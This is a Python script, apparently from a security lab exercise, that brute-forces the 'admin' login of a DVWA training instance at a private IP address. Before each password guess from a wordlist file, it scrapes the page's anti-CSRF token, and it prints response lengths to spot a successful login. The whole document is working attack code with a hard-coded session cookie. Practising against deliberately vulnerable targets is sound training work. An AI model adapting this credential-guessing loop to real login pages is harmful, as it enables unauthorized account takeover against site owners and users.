import requests
from bs4 import BeautifulSoup

url= "http://192.168.1.120/dvwa/vulnerabilities/brute/"
header={
	'Host': '192.168.1.120',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Referer': 'http://192.168.1.120/dvwa/vulnerabilities/brute/',
	'Cookie': 'security=high; PHPSESSID=th7rj18u5d2uc11gtc9tfq7snm',
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '1'
}
file=open('password.txt','r')
for line in file:
    line=line.strip()
    s=requests.Session()
    r=s.get(url,headers=header)
    soup=BeautifulSoup(r.text,'html.parser')
    user_token=soup.find_all('input')[3]['value']
    payload={
	'username':'admin',
        'password':line,
        'user_token':user_token,
        'Login':'Login'
        }
    html=s.get(url,params=payload,headers=header)
    length=len(html.text)
    print('user_token:'+user_token+'username:admin password:'+line+' length:'+str(length))
